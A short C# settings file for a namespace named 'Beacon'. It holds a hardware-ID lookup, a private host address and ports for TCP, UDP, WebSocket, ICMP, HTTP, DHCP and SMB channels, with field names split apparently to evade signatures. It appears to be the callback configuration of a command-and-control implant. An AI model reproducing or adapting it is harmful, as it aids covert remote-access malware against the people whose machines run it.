using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Beacon
{
    internal class Settings
    {
        public static string Hw_id = global::Beacon.Helper.Helper.HWID();
#if DEBUG
        public static string TCP_Por_ts = "8888";
        public static string UDP_Por_ts = "8888";
        public static string WS_Por_ts = "7777";
        public static string ICMP_Por_ts = "6666";
        public static string HTTP_Por_ts = "8080";
        public static string DHCP_Por_ts = "67";
        public static string SMB_Por_ts = "4445";
        public static string Hos_ts = "192.168.138.1";
        public static string Group = "222";

#else
        public static string TCP_Por_ts = "8888";
        public static string UDP_Por_ts = "8888";
        public static string WS_Por_ts = "7777";
        public static string ICMP_Por_ts = "6666";
        public static string HTTP_Por_ts = "8080";
        public static string DHCP_Por_ts = "67";
        public static string SMB_Por_ts = "4445";
        public static string Hos_ts = "192.168.138.1";
        public static string Group = "222";
#endif
    }
}